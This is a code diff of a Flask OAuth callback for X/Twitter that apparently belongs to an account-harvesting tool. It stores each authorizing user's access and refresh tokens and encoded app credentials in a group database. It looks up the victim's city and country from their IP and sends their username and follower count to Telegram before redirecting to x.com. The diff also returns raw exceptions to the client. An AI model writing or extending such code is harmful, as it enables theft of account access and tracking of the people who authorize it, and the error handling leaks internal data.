@@ -89,61 +89,64 @@ def auth_callback():
         return redirect("https://x.com/")
 
     access_token, refresh_token = exchange_token_for_access(authorization_code, request.base_url)
-    
     user_data = get_twitter_user_data(access_token)
-    print(user_data)
-    user_id = user_data['id']
-    username = user_data['username']
-    followers_count = user_data['public_metrics']['followers_count']
-    
-    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    location_res = requests.get(f'http://ip-api.com/json/{real_ip}')
-    location_data = location_res.json()
-    country, city = location_data.get("country"), location_data.get("city")
-    country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
-    location = f"{country_flag} {city}, {country}"
-    
-    authorization_time = datetime.utcnow()
-    
-    group_id = session.get("group_id")
-    existing_user = groups.find_one({
-        "group_id": group_id,
-        "authenticated_users.user_id": user_id
-    })
-    
-    if existing_user:
-        groups.update_one(
-            {"group_id": group_id, "authenticated_users.user_id": user_id},
-            {"$set": {
-                "authenticated_users.$.username": username,
-                "authenticated_users.$.location": location,
-                "authenticated_users.$.access_token": access_token,
-                "authenticated_users.$.refresh_token": refresh_token
-            }}
-        )
-    else:
-        TWITTER_CLIENT_ID = session.get("client_id")
-        TWITTER_CLIENT_SECRET = session.get("client_secret")
-        credentials = base64.b64encode(f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}".encode()).decode('utf-8')
-        groups.update_one(
-            {"group_id": group_id},
-            {
-                "$push": {
-                    "authenticated_users": {
-                        "user_id": user_id,
-                        "username": username,
-                        "location": location,
-                        "access_token": access_token,
-                        "refresh_token": refresh_token,
-                        "credentials": credentials,
-                        "authorized_at": authorization_time
+    try:
+        user_id = user_data['id']
+        username = user_data['username']
+        followers_count = user_data['public_metrics']['followers_count']
+        
+        real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        location_res = requests.get(f'http://ip-api.com/json/{real_ip}')
+        location_data = location_res.json()
+        country, city = location_data.get("country"), location_data.get("city")
+        country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
+        location = f"{country_flag} {city}, {country}"
+        
+        authorization_time = datetime.utcnow()
+        
+        group_id = session.get("group_id")
+        existing_user = groups.find_one({
+            "group_id": group_id,
+            "authenticated_users.user_id": user_id
+        })
+        
+        if existing_user:
+            groups.update_one(
+                {"group_id": group_id, "authenticated_users.user_id": user_id},
+                {"$set": {
+                    "authenticated_users.$.username": username,
+                    "authenticated_users.$.location": location,
+                    "authenticated_users.$.access_token": access_token,
+                    "authenticated_users.$.refresh_token": refresh_token
+                }}
+            )
+        else:
+            TWITTER_CLIENT_ID = session.get("client_id")
+            TWITTER_CLIENT_SECRET = session.get("client_secret")
+            credentials = base64.b64encode(f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}".encode()).decode('utf-8')
+            groups.update_one(
+                {"group_id": group_id},
+                {
+                    "$push": {
+                        "authenticated_users": {
+                            "user_id": user_id,
+                            "username": username,
+                            "location": location,
+                            "access_token": access_token,
+                            "refresh_token": refresh_token,
+                            "credentials": credentials,
+                            "authorized_at": authorization_time
+                        }
                     }
                 }
-            }
-        )
+            )
 
-    send_to_telegram(username, followers_count, group_id)
-    return redirect(session.get("redirect_url", "https://x.com/"))
+        send_to_telegram(username, followers_count, group_id)
+        return redirect(session.get("redirect_url", "https://x.com/"))
+    except Exception as e:
+        print(e)
+        print(user_data)
+        return e
 
 
 def exchange_token_for_access(authorization_code, redirect_uri):
